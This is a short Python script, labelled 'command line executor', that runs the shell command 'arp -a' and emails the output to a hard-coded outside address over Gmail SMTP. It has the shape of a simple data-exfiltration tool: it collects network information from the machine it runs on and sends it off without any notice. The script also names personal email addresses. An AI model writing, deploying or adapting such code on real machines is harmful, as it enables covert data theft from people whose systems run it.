























'''
command line executor
'''

import subprocess
import smtplib

def send_mail(source_email, dest_email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(source_email, password)
    server.sendmail(source_email, dest_email, message)
    server.quit()

command = "arp -a"
result = subprocess.check_output(command, shell=True)
send_mail("santicyberpirate@gmail.com",
          "seansantiago@rocketmail.com",
          "password here",
          result)


















